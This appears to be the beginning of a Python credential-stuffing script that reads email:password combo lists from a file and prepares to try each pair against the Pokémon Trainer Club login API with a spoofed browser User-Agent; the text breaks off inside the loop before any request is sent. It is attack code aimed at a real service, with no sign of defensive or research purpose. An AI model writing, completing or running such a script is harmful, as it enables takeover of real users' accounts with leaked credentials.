import requests
import json

# Load combos from file
with open("combos.txt", "r") as f:
    combos = [line.strip().split(":") for line in f if ":" in line]

# Headers for the request
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Content-Type": "application/json"
}

# Login endpoint and page URL
login_url = "https://www.pokemon.com/us/api/login"
page_url = "https://www.pokemon.com/us/pokemon-trainer-club/login"

# Loop through combos
for email, password in combos:
    payload
